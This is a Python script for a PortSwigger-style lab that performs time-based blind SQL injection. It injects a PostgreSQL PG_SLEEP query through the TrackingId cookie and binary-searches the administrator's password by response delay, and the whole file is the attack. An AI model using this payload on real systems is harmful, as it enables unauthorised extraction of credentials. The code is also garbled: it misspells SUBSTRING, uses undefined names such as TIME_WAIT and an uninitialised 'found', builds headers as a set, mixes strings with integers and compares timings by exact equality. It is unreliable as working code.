#!/usr/bin/python3.6

import requests
import time

LAB_URL = 'ac541fd01f7f079b800b5d2a005a0091.web-security-academy.net'
PASSWORD_LENGTH = 6
WAIT_TIME = 5
COUNT = 1
password = ''

_payload = lambda count, ch, operator: 'xyz\'%3BSELECT+CASE+WHEN+ \
(username=\'administrator\'+AND+SUBTRING(password, 1,'+ COUNT +')'+operator+'\'' + ch + '\'' + ')+THEN+PG_SLEEP('+ WAIT_TIME + ')+ELSE+PG_SLEEP(0)+END--' 

_headers = lambda payload: {'Cookie: TrackingId=' + payload + 'session='}

while COUNT <= PASSWORD_LENGTH:
	first = 33
	last = 126
	mid = None

	while first <= last and not found:
		mid = (first + last)//2
		payload_str = _payload(str(COUNT), chr(mid), '=')
		#make request with payload and check delay
		print('[*]Sending request {}...'.format(payload_str))
		t1 = time.perf_counter()
		res = requests.get(LAB_URL, headers=_headers(payload_str))
		t2 = time.perf_counter()
		
		time_diff = t2 - t1
		if time_diff == TIME_WAIT:
			print('[*]Found character {} at position {}...'.format(chr(mid), COUNT))
			password += chr(mid)
			found = True
		else:
			payload_str = _payload(str(COUNT), chr(mid), '>')
			print('[*]Sending request {}...'.format(payload_str))
			t1 = time.perf_counter()
			res = requests.get(LAB_URL, headers=_headers(payload_str))
			t2 = time.perf_counter()

			time_diff = t2 - t1
			if time_diff == TIME_WAIT:
				first = mid + 1
			else:
				last = mid - 1
	COUNT += 1

print('-------------------------------------\n\n')
if password:
	print('Found password {}'.format(password))
else:
	print('Password not found')						
